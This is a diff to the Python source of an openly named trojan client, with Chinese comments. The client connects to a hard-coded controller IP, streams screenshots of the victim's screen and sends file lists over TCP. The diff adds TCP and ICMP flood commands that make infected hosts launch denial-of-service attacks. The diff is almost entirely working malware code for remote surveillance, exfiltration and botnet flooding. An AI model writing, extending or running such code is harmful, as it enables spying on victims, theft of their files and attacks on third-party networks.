@@ -6,6 +6,7 @@ import sys
 
 from PIL import ImageGrab, Image
 
+from Attacker import Attacker
 from FileExplorer import FileExplorer
 
 '''
@@ -23,7 +24,7 @@ import time
 from queue import Queue
 from threading import Thread
 
-master_ip = '100.95.220.202'
+master_ip = '100.95.220.133'
 
 
 def restart_program():
@@ -114,6 +115,9 @@ class TrojanClient:
         self.picTime = 5  # 每张截图时间间隔为 picTime * 0.05
 
         self.picThread = None
+        self.width = 672
+
+        self.attacker = Attacker()
 
     def cmdRecv(self):
         while True:
@@ -145,21 +149,24 @@ class TrojanClient:
             print("已取得, 正在发送:", cmd)
             if not self.tcpSocket:
                 return
-            self.tcpSocket.send(struct.pack('i', len(cmd.encode("utf8"))))
-            self.tcpSocket.send(cmd.encode("utf8"))
-            if cmd == "pic":
-                imd = data.tobytes()
-                img_len = len(imd)
-                self.tcpSocket.send(struct.pack('iii', *data.size, img_len))
-                self.tcpPieceSend(imd, self.tcpSocket, 1024)
+            try:
+                self.tcpSocket.send(struct.pack('i', len(cmd.encode("utf8"))))
+                self.tcpSocket.send(cmd.encode("utf8"))
+                if cmd == "pic":
+                    imd = data.tobytes()
+                    img_len = len(imd)
+                    self.tcpSocket.send(struct.pack('iii', *data.size, img_len))
+                    self.tcpPieceSend(imd, self.tcpSocket, 1024)
 
-            elif cmd == "response":
-                self.tcpSocket.send(struct.pack('i', len(data.encode("utf8"))))
-                self.tcpSocket.send(data.encode("utf8"))
+                elif cmd == "response":
+                    self.tcpSocket.send(struct.pack('i', len(data.encode("utf8"))))
+                    self.tcpSocket.send(data.encode("utf8"))
 
-            elif cmd == "filelist":
-                self.tcpSocket.send(struct.pack('i', len(data)))
-                self.tcpPieceSend(data, self.tcpSocket, 1024)
+                elif cmd == "filelist":
+                    self.tcpSocket.send(struct.pack('i', len(data)))
+                    self.tcpPieceSend(data, self.tcpSocket, 1024)
+            except:
+                print("控制端断开")
 
     def tcpSend(self, cmd, data=None):
         self.tcpSQ.put({
@@ -222,18 +229,29 @@ class TrojanClient:
                 if self.tcpSocket:
                     self.tcpSocket.close()
                     self.tcpSocket = None
+            elif cmd == 'tcpFlood':
+                # dst_ip  port start end
+                self.attacker.allFlood(*allcmd[1:])
+            elif cmd == 'icmpFlood':
+                self.attacker.icmpAttack(allcmd[1])
+            elif cmd == 'floodStop':
+                self.attacker.enableStop = True
             elif cmd == 'pic':
                 self.enablePic = True
                 self.sendPic(disposable=True)
             elif cmd == 'picstart':
                 self.enablePic = True
-                self.picThread = Thread(target=self.sendPic, daemon=True)
-                self.picThread.start()
+                if not self.picThread:
+                    self.picThread = Thread(target=self.sendPic, daemon=True)
+                    self.picThread.start()
             elif cmd == "picstop":
                 self.enablePic = False
+                self.picThread = None
             elif cmd == "set":
                 if allcmd[1] == "pictime":
                     self.picTime = int(allcmd[2])
+                elif allcmd[1] == "picwidth":
+                    self.width = int(allcmd[2])
             elif cmd == 'upload':
                 filename = allcmd[1]
                 size = int(allcmd[2])
@@ -282,7 +300,7 @@ class TrojanClient:
         while self.enablePic:
             print("...", end='')
             im = ImageGrab.grab()
-            im = im.resize((672, int(im.size[1] * 672 / im.size[0])), Image.ANTIALIAS)
+            im = im.resize((self.width, int(im.size[1] * self.width / im.size[0])), Image.ANTIALIAS)
             self.tcpSend(cmd='pic', data=im)
             time.sleep(self.picTime * 0.05)
             if disposable:
